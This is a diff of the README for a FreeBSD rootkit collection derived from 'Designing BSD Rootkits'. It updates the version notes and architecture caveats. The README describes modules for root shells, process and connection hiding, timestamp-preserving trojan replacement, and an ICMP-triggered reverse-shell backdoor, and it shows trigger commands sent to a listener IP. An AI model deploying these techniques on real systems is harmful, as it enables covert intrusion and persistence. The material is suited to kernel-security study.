@@ -1,9 +1,9 @@
 # kld-rootkit
-## A collection of FreeBSD 13.1 rootkit kernel modules and utilities
+## A collection of FreeBSD 13.2 rootkit kernel modules and utilities
 
 **TL;DR ./install_rootkit.sh -s**
 
-This rootkit was developed and tested on FreeBSD 13.1-RELEASE. It is a
+This rootkit was developed and tested on FreeBSD 13.2-RELEASE. It is a
 collection of kernel modules and utilities derived from the examples in
 Joseph Kong's excellent book [DESIGNING BSD ROOTKITS](https://nostarch.com/rootkits.htm), which I highly encourage
 anyone with interest in kernel programming to read.
@@ -37,7 +37,7 @@ rootkit:
 | knight-me | Uses the knighted system call to drop the user into a rootshell. |
 | interface-deepbg | Uses the deepbg system call to hide a running process and it's direct children. |
 | interface-whisper | Uses the whisper system call to hide an open TCP connection. |
-| loader | Works in conjunction with stash and file_redirection to replace a file with a trojan without altering the file's access and modification times. |
+| loader | Works in conjunction with stash and file_redirection to replace a file with a trojan without altering the file's access and modification times. The machine code in this program is specific to the amd64 architecture. Depending on architecture, compiler, compile flags, etc, it may need modification to be compatible with the target kernel. |
 | trigger | Used with the order_66 backdoor and a listener like netcat (nc) to make a reverse shell connection. |
 
 ## Miscellaneous
@@ -47,7 +47,7 @@ but were included as examples of various other techniques from the book:
 | ------- | ----------- |
 | interface-kmalloc | User space program that demonstrates using modfind to locate the kmalloc syscall and then invokes it allocate kernel memory. |
 | kvm-write | User space program that demonstrates using kvm (kernel memory interface) to write to kernel memory. |
-| test-kmalloc-patch | User space program which demonstrates run-time kernel memory patching to allocate kernel memory. |
+| test-kmalloc-patch | User space program which demonstrates run-time kernel memory patching to allocate kernel memory. The machine code in this program is specific to the amd64 architecture. Depending on architecture, compiler, compile flags, etc, it may need modification to be compatible with the target kernel. |
 
 ## How to Install
 
@@ -158,7 +158,7 @@ From anywhere run:
     perl -e 'print "\xfa\x01\xa8\xc0\x15\xb3"' >> /tmp/payload
     nemesis icmp -i 5 -c 3 -P /tmp/payload -D 192.168.1.123
 
-From the netcat session on the listener (*listener-host*), begin executing commands at the "#" prompt
+From the netcat session on the listener (*192.168.1.250*), begin executing commands at the "#" prompt
 
 ### Persistence
 
